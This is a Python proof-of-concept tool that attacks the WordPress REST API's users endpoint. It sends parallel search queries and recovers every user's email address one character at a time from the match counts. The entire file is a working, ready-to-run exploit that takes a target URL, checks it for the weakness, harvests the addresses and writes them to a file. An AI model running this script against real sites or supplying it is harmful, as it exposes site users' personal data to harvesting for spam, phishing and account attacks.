#!/usr/bin/python3

import argparse
import logging
import requests
import json
import concurrent.futures
from collections import Counter

class WPExtractor:
    def __init__(self, instance_url, alphabet="abcdefghijklmnopqrstuvwxyz1234567890", threads=16, max_retries=3):
        self.instance = instance_url.rstrip("/")
        self.users_api = instance_url + "/wp-json/wp/v2/users"
        self.alphabet = alphabet
        self.threads_num = threads
        self.max_retries = max_retries


    def print_progress(self, replace=True, max_display=15):
        # only display the first few email addresses
        # to prevent messing up the terminal on targets with many users
        displayed_num = min(self.users_num, max_display)
        undisplayed_num = 0 if displayed_num == self.users_num else self.users_num - displayed_num

        if replace:
            # move cursor up to overwrite the emails printed in last iteration
            print("\033[A" * (displayed_num + 1), end="")

        # print partially extracted email addresses
        for email in self.emails[:displayed_num]:
            print(email)
        if undisplayed_num:
            print(f"{undisplayed_num} more...")
        else:
            print("")


    def save(self, filename):
        # save results to a local file
        with open(filename, "w") as outfile:
            outfile.write("\n".join(self.emails))


    def search(self, search="", retries=3):
        # returns number of users matching the provided search term
        # returns None on an error
        if retries < 0:
            return None

        try:
            res = requests.get(self.users_api + f"?per_page=100&search={search}")
            return len(json.loads(res.content))
        except requests.exceptions.RequestException as e:
            # decrement the retries counter and try again
            return self.search(search, retries=retries-1)


    def check_vulnerability(self):
        logging.info(f"Checking site {self.instance}/...")

        try:
            # check if the site is responsive
            requests.get(self.instance)
        except requests.exceptions.RequestException:
            logging.error("Site is not accessible (is the server up?)\n")
            return False

        # check if the /users JSON API is available
        res = requests.get(self.users_api)
        if res.status_code != 200 or not res.content or "application/json" not in res.headers["Content-Type"]:
            logging.error("WordPress 'users' API not available\n")
            return False

        # verify that at least one user email address
        # is available for extraction
        users_with_emails = self.search("@", retries=self.max_retries)
        if not users_with_emails > 0:
            logging.error("No users with extractable email addresses found\n")
            return False

        # set variables accessible to all class methods
        self.users_num = users_with_emails
        self.emails = ["@"] * self.users_num

        return True


    def extract(self, target="domain"):
        # extracts all email addresses on a character-by-character basis
        # this function should called twice, once with "domain" and once with "user"
        # returns a boolean indicating whether the extraction attempt was successful

        # verify argument is valid
        if target != "domain" and target != "user":
            logging.error("Invalid target (allowed targets: domain, email)")
            return False

        completed_count = 0
        complete_emails = [""] * self.users_num

        while True:
            if completed_count == self.users_num:
                break

            idx = 0
            for email, count in Counter(self.emails).items():
                if count == complete_emails.count(email):
                    # ignore email addresses that are already completely extracted
                    idx += count
                    continue

                total_found = 0

                # use concurrent futures to send API requests in parallel
                executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.threads_num)
                futures = []
                future_payload_mapping = {}

                # submit a task for each character in the alphabet
                for char in self.alphabet:
                    payload = email + char if target == "domain" else char + email
                    future = executor.submit(self.search, payload, retries=self.max_retries)
                    futures.append(future)
                    future_payload_mapping[future] = payload

                # iterate through the tasks as they complete
                # and process the results
                for future in concurrent.futures.as_completed(futures):
                    payload = future_payload_mapping[future]
                    matches = future.result()

                    if matches == None:
                        # an error occurred and we have to return
                        logging.error("A network error occurred during email extraction")
                        logging.error("Try increasing the max_retries option and try again")
                        return False

                    if matches:
                        # if we found n matches, we successfully extracted 
                        # the next character of n email addresses
                        for i in range(idx, idx + matches):
                            self.emails[i] = payload

                        idx += matches
                        total_found += matches

                        self.print_progress()

                    if total_found == count:
                        # once we found the next character in all emails,
                        # we don't care about the rest of the tasks
                        executor.shutdown(wait=False, cancel_futures=True)
                        break

                if count != total_found:
                    # if we didn't get a match for each email address,
                    # it means one of the following:
                    #
                    # 1: there are no more characters in the remaining email addresses
                    #    (yay, we extracted the entire thing!)
                    #
                    # 2: some email addresses contain characters we didn't include in
                    #    our alphabet
                    #
                    # we report this case as a successfully extracted email address

                    new_complete = count - total_found
                    for i in range(idx, idx + new_complete):
                        complete_emails[i] = self.emails[i]
                    completed_count += new_complete
                    idx += new_complete

        return True


    def execute(self):
        # main function
        # attempts to execute the attack and returns a boolean indicating whether it was successful
        if self.check_vulnerability():
            logging.info("Target is up and appears to be vulnerable, starting email extraction\n")
            self.print_progress(replace=False)
            if self.extract(target="domain") and self.extract(target="user"):
                logging.info("Email extraction complete")
                return True
            else:
                # an error occured
                return False

        else:
            logging.error("Target does not seem vulnerable, exiting...")
            return False


def parse_arguments():
    parser = argparse.ArgumentParser(description='WordPress email extractor - Proof of Concept tool')
    parser.add_argument("-u", "--url", dest="url", type=str, help="URL of target WordPress instance", required=True)
    parser.add_argument("-t", "--threads", dest="threads", type=int, help="number of threads to use", default=16)
    parser.add_argument("-m", "--max-retries", dest="max_retries", type=int, help="maximum number of retries on network errors", default=3)
    parser.add_argument("-a", "--alphabet", dest="alphabet", type=str, help="alphabet used in email extraction", default="abcdefghijklmnopqrstuvwxyz1234567890._-")
    parser.add_argument("-o", "--out", dest="filename", type=str, help="save result to a local file", default="")
    parser.add_argument("-s", "--silent", dest="log_level", action="store_const", const=logging.WARNING, default=logging.INFO, help="don't log non-essential messages")

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_arguments()
    logging.basicConfig(format="%(message)s", level=args.log_level)
    outfile = args.filename

    extractor = WPExtractor(args.url, alphabet=args.alphabet, threads=args.threads, max_retries=args.max_retries)
    success = extractor.execute()

    if not success:
        exit()

    if outfile:
        extractor.save(outfile)
